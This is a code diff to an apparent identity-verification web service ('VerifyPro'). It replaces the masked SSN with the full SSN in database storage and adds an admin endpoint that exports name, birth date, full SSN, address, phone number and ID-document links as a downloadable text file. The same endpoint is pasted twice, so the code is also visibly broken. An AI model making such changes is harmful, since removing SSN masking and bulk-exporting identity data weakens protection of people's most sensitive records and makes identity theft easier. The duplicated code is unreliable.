@@ -199,7 +199,7 @@ async function saveVerificationToMongoDB(formData, files) {
             orderNumber: formData.orderNumber,
             fullName: formData.fullName,
             dateOfBirth: formData.dateOfBirth,
-            ssn: `***-**-${formData.ssn.slice(-4)}`,
+            ssn: formData.ssn,
             fullAddress: formData.fullAddress,
             whatsappNumber: formData.whatsappNumber,
             files: {
@@ -441,6 +441,51 @@ app.delete('/api/admin/verifications/:id', requireAdmin, async (req, res) => {
     }
 });
 
+// API: Download order details (admin)
+app.get('/api/admin/download/:id', requireAdmin, async (req, res) => {
+    try {
+        const verification = await Verification.findById(req.params.id);
+        if (!verification) {
+            return res.status(404).json({ error: 'Verification not found' });
+        }
+
+        // Create text content for download
+        const content = `VERIFYPRO - ORDER DETAILS REPORT
+================================
+
+Order Number: ${verification.orderNumber}
+Generated: ${new Date().toLocaleString()}
+
+PERSONAL INFORMATION
+-------------------
+Full Name: ${verification.fullName}
+Date of Birth: ${verification.dateOfBirth}
+SSN: ${verification.ssn}
+Full Address: ${verification.fullAddress}
+WhatsApp Number: ${verification.whatsappNumber}
+
+DOCUMENTS
+---------
+Driver License (Front): ${verification.files?.dlFront || 'N/A'}
+Driver License (Back): ${verification.files?.dlBack || 'N/A'}
+Utility Bill: ${verification.files?.utilityBill || 'N/A'}
+
+STATUS INFORMATION
+------------------
+Status: ${verification.status}
+Submitted At: ${new Date(verification.submittedAt).toLocaleString()}
+Last Updated: ${new Date(verification.updatedAt).toLocaleString()}`;
+
+        // Set response headers for download
+        res.setHeader('Content-Type', 'text/plain; charset=utf-8');
+        res.setHeader('Content-Disposition', `attachment; filename="Order_${verification.orderNumber}_Details.txt"`);
+        res.send(content);
+    } catch (error) {
+        console.error('Error downloading details:', error);
+        res.status(500).json({ success: false, error: 'Server error' });
+    }
+});
+
 // Serve admin pages
 app.get('/admin/login', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'admin-login.html'));
@@ -448,6 +493,53 @@ app.get('/admin/login', (req, res) => {
 
 app.get('/admin', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'admin-dashboard.html'));
+});
+
+// API: Download order details (admin)
+app.get('/api/admin/download/:id', requireAdmin, async (req, res) => {
+    try {
+        const verification = await Verification.findById(req.params.id);
+        if (!verification) {
+            return res.status(404).json({ error: 'Verification not found' });
+        }
+
+        // Create text content for download
+        const content = `
+VERIFYPRO - ORDER DETAILS REPORT
+================================
+
+Order Number: ${verification.orderNumber}
+Generated: ${new Date().toLocaleString()}
+
+PERSONAL INFORMATION
+-------------------
+Full Name: ${verification.fullName}
+Date of Birth: ${verification.dateOfBirth}
+SSN: ${verification.ssn}
+Full Address: ${verification.fullAddress}
+WhatsApp Number: ${verification.whatsappNumber}
+
+DOCUMENTS
+---------
+Driver License (Front): ${verification.files?.dlFront || 'N/A'}
+Driver License (Back): ${verification.files?.dlBack || 'N/A'}
+Utility Bill: ${verification.files?.utilityBill || 'N/A'}
+
+STATUS INFORMATION
+------------------
+Status: ${verification.status}
+Submitted At: ${new Date(verification.submittedAt).toLocaleString()}
+Last Updated: ${new Date(verification.updatedAt).toLocaleString()}
+        `;
+
+        // Set response headers for download
+        res.setHeader('Content-Type', 'text/plain; charset=utf-8');
+        res.setHeader('Content-Disposition', `attachment; filename="Order_${verification.orderNumber}_Details.txt"`);
+        res.send(content);
+    } catch (error) {
+        console.error('Error downloading details:', error);
+        res.status(500).json({ success: false, error: 'Server error' });
+    }
 });
 
 // Serve index page
